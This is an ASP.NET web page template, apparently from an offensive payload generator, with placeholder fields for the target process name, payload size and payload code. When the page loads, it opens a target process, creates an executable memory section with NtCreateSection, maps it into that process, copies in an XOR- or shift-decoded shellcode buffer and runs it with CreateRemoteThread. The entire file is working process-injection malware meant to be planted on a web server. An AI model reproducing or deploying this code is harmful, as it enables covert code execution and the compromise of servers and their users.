<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.Linq" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Threading.Tasks" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtCreateSection(
            ref IntPtr SectionHandle,
            UInt32 DesiredAccess,
            IntPtr ObjectAttributes,
            ref UInt32 MaximumSize,
            UInt32 SectionPageProtection,
            UInt32 AllocationAttributes,
            IntPtr FileHandle);
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            UIntPtr ZeroBits,
            UIntPtr CommitSize,
            out ulong SectionOffset,
            out uint ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);


        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        void handle_code(string func, uint ntstatus)
        {
            if (ntstatus != 0)
            {
                Response.Write(func + " Failed with error code " + ntstatus);
                if (ntstatus == 0xc000000d)
                {
                    Response.Write("An invalid parameter was passed to a service or function.");
                }
            }
        }

        static byte[] xor(byte[] v, string key)
        {
            byte[] b = new byte[v.Length];
            byte[] kb = System.Text.Encoding.ASCII.GetBytes(key);
            for(int i = 0; i < b.Length; i++) {
                b[i] = (byte)((v[i] ^ kb[i % kb.Length]) & 0xff);
            }
            return b;
        }
        static byte[] cae(byte[] v, int key)
        {
            byte[] b = new byte[v.Length];
            for(int i = 0; i < b.Length; i++) {
                b[i] = (byte)((v[i] -key) & 0xff);
            }
            return b;
        }

        protected void Page_Load(object sender, EventArgs e)
        {
            int pid;
            try {
                if ("%inject_name%".Length != 0)
		    pid = Process.GetProcessesByName("%inject_name%").First().Id;
                else
                    pid = Process.GetCurrentProcess().Id;
            } catch {
                pid = Process.GetCurrentProcess().Id;
            }
            IntPtr remoteProcess = OpenProcess(0x001F0FFF, false, pid);

            IntPtr SectionHandle = IntPtr.Zero;
            uint MaximumSize = %size%;
            uint SEC_COMMIT = 0x08000000;
            uint SECTION_MAP_WRITE = 0x0002;
            uint SECTION_MAP_READ = 0x0004;
            uint SECTION_MAP_EXECUTE = 0x0008;
            uint SECTION_ALL_ACCESS = SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE;
            uint PAGE_EXECUTE_READWRITE = 0x40;

            uint res = NtCreateSection(ref SectionHandle, SECTION_ALL_ACCESS, IntPtr.Zero, 
                ref MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
            handle_code("NtCreateSection", res);

            %code%
            IntPtr localSectionAddress = IntPtr.Zero, remoteSectionAddress = IntPtr.Zero;
            uint outSize;
            ulong sectionOffset;
            uint PAGE_READWRITE = 0x04, PAGE_EXECUTE_READ = 0x20;
            uint ViewUnmap = 2; // not inherit map view to child

            IntPtr currentProcess = Process.GetCurrentProcess().Handle;
            res = NtMapViewOfSection(SectionHandle, currentProcess, ref localSectionAddress, UIntPtr.Zero, 
                UIntPtr.Zero, out sectionOffset, out outSize, ViewUnmap, 0, PAGE_READWRITE);
            handle_code("NtMapViewOfSection", res);

            res = NtMapViewOfSection(SectionHandle, remoteProcess, ref remoteSectionAddress, UIntPtr.Zero, 
                UIntPtr.Zero, out sectionOffset, out outSize, ViewUnmap, 0, PAGE_EXECUTE_READ);
            handle_code("NtMapViewOfSection", res);
            if (res != 0) {
                pid = Process.GetCurrentProcess().Id;
                remoteProcess = OpenProcess(0x001F0FFF, false, pid);
                res = NtMapViewOfSection(SectionHandle, remoteProcess, ref remoteSectionAddress, UIntPtr.Zero, 
                    UIntPtr.Zero, out sectionOffset, out outSize, ViewUnmap, 0, PAGE_EXECUTE_READ);
            }

            Marshal.Copy(buf, 0, localSectionAddress, buf.Length);
            
            IntPtr hThread = CreateRemoteThread(remoteProcess, IntPtr.Zero, 0, remoteSectionAddress, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

            handle_code("NtUnmapViewOfSectionC", NtUnmapViewOfSection(currentProcess, localSectionAddress));
            handle_code("NtUnmapViewOfSectionR", NtUnmapViewOfSection(remoteProcess, remoteSectionAddress));

            handle_code("NtClose", (uint) NtClose(SectionHandle));
        }
</script>
